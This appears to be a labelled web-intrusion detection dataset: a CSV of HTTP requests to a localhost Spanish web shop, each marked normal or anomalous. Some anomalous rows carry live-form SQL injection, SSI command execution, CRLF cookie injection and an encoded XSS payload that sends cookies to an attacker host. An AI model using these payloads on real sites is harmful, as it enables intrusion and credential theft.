URL,Target
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alred&password=medus%3Fa&nombre=Andr%F3cies&apellidos=Ayll%F3n+Tamallangos&email=cabral_crowther%40frioelectric.br&dni=21335513T&direccion=Polux%2C+198%2C+&ciudad=Coru%F1a+del+Conde&cp=43869&provincia=C%E1ceres&ntc=0120957560122435&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2881&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/IISSamples/sdk/asp/docs/libcodebrws.inc,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/6909030637832563290.jsp,1
http://localhost:8080/6909030637832563290.jsp.Old,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=6027&B1=Confirmar,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/miembros/index.jsp/6909030637832563290.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=swidersk&password=balarrasa&nombre=Yaco&apellidos=Moriana+Romanov&email=sintes%40noticiasenvivo.mz&dni=19184B220N&direccion=C%2F+Parque+Iguazu+99%2C+&ciudad=Ag%FCimes&cp=48940&provincia=Valencia&ntc=3622353817159390&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidadA=91&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/WebSphereSamples/,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27OR%27a%3D%27a&login=swen&pwd=incisorio&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/6909030637832563290.jsp,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85%2F&cantidad=17&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=maxin&pwd=5at5s&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=6867&B1=Confirmar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2231&B1=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=zaharoff0&password=deYectA&nombre=Itter&apellidos=Gutarra+Marimon&email=hayashi%40librodeapuntes.tc&dni=81587818X&direccion=Veintinueve+De+Abril+0%2C+&ciudad=Alcoleja&cp=44122&provincia=Valencia&ntc=8364037780922932&B1=Registrar,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marjan&password=ce16esi4a9&nombre=Rene%E9&apellidos=Pi%F1ol+Monguzzi&email=clapham.gravey%40juguetespersonales.ye&dni=79234827B&direccion=Merce%2C+182+&ciudad=Villagarc%EDa+de+Campos&cp=34305&provincia=Alicante&ntc=780906401924818&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.Old,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/asf-logo-wide.gif/.INC,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4396&B1=Confirmar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=53&B1=A%F1adir+al+carrito,0
http://localhost:8080/servlet/SnoopServlet,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jarel&password=AbuRelADo&nombre=Ivon&apellidos=Ezcurra+Lo+Cascio&email=prussel%40mataluenga.co&dni=53238791R&direccion=Pl.+Guerrero+Strachan+S%2FN+4-A&ciudad=Higuera+de+la+Serena&cp=05150&provincia=Cantabria&ntc=1990568850978005&B1=Registrar,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=17&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=farringt&password=comp9%F15ela&nombre=Merl%EDn&apellidos=Novelles+Madrera&email=finocchiaro_tilbury%40enfuerteventura.com.py&dni=%27+AND+%271%27%3D%271&direccion=Avenida+Palencia%2C+S%2FN+9-C&ciudad=Gamones&cp=33315&provincia=Teruel&ntc=9165929782828582&B1=Registrar,1
http://localhost:8080/CFIDE/administrator/left.cfm,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=miron&password=r8u9c5&nombre=Eli&apellidos=Fonolla+Calera&email=galligan%40bijoubijoudiferente.vg&dni=60929799Q&direccion=C%2F+Montereria%2C+146+4D&ciudad=Odieta&cp=33734&provincia=Zamora&ntc=7785029270305483&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ambros&pwd=indiligencia&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/miembros/imagenes.Old,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/global.Old,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8363&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jobyna&password=CAB5254A&nombreA=Amru&apellidos=Membrives+Larragoiti&email=tandy-thate%40viscotek.rs&dni=16093683P&direccion=C%2F+Lucentum+86+&ciudad=Salas+de+los+Infantes&cp=25400&provincia=Segovia&ntc=2519318826209754&B1=Registrar,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kent&password=ergo226825e&nombre=Catrielcelis&apellidos=Riego&email=cecchini_polonsky%40iurispretor.info&dni=79071325Q&direccion=C%2F+Mayolica+158+4A&ciudad=Santa+Cruz+de+la+Zarza&cp=46700&provincia=Cuenca&ntc=0293148493278191&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=78any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kruse&password=mercantesca&nombre=Casida&apellidos=Di+Rado+Elejalde&email=cianneli%40connect.pg&dni=25114760W&direccion=Cardedeu+54+&ciudad=Benasque&cp=26580&provincia=Guadalajara&ntc=2589729012586382&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp/4861362529278789730.OLD,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=61&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=savard&pwd=robora%2Cti%2Cv%27a&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ehninger&password=RObaDOra&nombre=Dana&apellidos=Jerez+Brecha&email=pierpoint%40youtubed.sh&dni=52181980V&direccion=Pl.+Santiago+Apostol+79+10-F&ciudad=Realejos%2C+Los&cp=24142&provincia=Baleares+%28Illes%29&ntc=9366583302251207&B1=Registrar,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/CFIDE/administrator/checkfile.cfm,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5151&B1=Confirmar%2F,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/miembros/imagenes/4861362529278789730.OLD,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=clarabel&password=enconadura&nombre=Dalmiro&apellidos=Oti%F1a&email=redmond-delcampe%40biosaludsystems.do&dni=39699852N&direccion=Calle+Corinto+108+&ciudad=San+Vicente+del+Raspeig%2FSant+Vicent+del+Raspeig&cp=47606&provincia=Girona&ntc=7861645517279429&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=50&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mclawhor&pwd=ga7b%EDn&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=loke&password=realmente&nombre=Pandulfo&apellidos=Del+Barrio&email=goodard-negrell%40cirugiaalbeiteria.si&dni=63298862X&direccion=Praza+Da+Herva+144%2C+&ciudad=Gualta&cp=42112&provincia=Madrid&ntc=7379824468809426&B1=Registrar,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6840any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Confirmar,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8703&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cybotech&pwd=escobado&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidadA=25&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcmanus&pwd=42aCHE&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&B1A=Confirmar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=16&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=m%3Fanley&pwd=carteo&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6991&B1=Pasar+por+caja,0
http://localhost:8080.BAK,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=branden&password=resAca&nombre=Teodosio&apellidos=Batallanos+Halpin&email=courtney_lovelle%40quehaces.cy&dni=12772631H&direccion=Avenida+Patrimonio+De+La+Humanidad+64+13-A&ciudad=Estepa&cp=46813&provincia=Zaragoza&ntc=1498074049868909&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amabelle&password=COmplEtoRio&nombre=Samuel&apellidos=Bail%E9n+Lapetini&email=novikoff%40schnapps.com.cl&dni=42010181Z&direccion=Caba%F1eros%2C+131+&ciudad=Almacelles&cp=43896&provincia=%C1vila&ntc=6273831231107298&B1=Registrar,0
http://localhost:8080/tienda1.Old,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp/,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=carmelo%22+AND+%221%22%3D%221&pwd=pREcis*A&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=world.fa&pwd=entremeter&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ivancevi&password=postrar&nombre=Rayen&apellidos=Urgeles+Montanuy&email=lovas%40djbroadcast.bn&dni=21096784B&direccion=Nuestra+Se%F1ora+De+La+Paz%2C+80+8F&ciudad=Castej%F3n+de+Henares&cp=37748&provincia=Girona&ntc=7058252446193830&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jared&password=anunciador&nombre=Gisela&apellidos=Downs&email=azema.alvir%40telogis.gf&dni=72932222G&direccion=C%2F+Madrid%2C+53+5-F&ciudad=Aldehuela+de+Yeltes&cp=09247&provincia=Guadalajara&ntc=9385780627956523&B1=Registrar,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brana&password=holgachona&nombre=Romana&apellidos=Cabal+Urrupa%EDn&email=quest%40palmatraducciones.pw&dni=58157080Q&direccion=Lopez+Castrillon+162+&ciudad=Zambrana&cp=46688&provincia=Navarra&ntc=7449583219109875&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&login=tiong-ho&password=an1l5m9no&nombre=Hadasa&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=chevarie&password=9l67i02n4e&nombre=Yamand%FA&apellidos=Ivern&email=olteanu%40elcarritodelacompra.rw&dni=35537130Z&direccion=Plza.+Juventud+85%2C+&ciudad=Orendain&cp=07190&provincia=C%E1ceres&ntc=5864932809753422&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
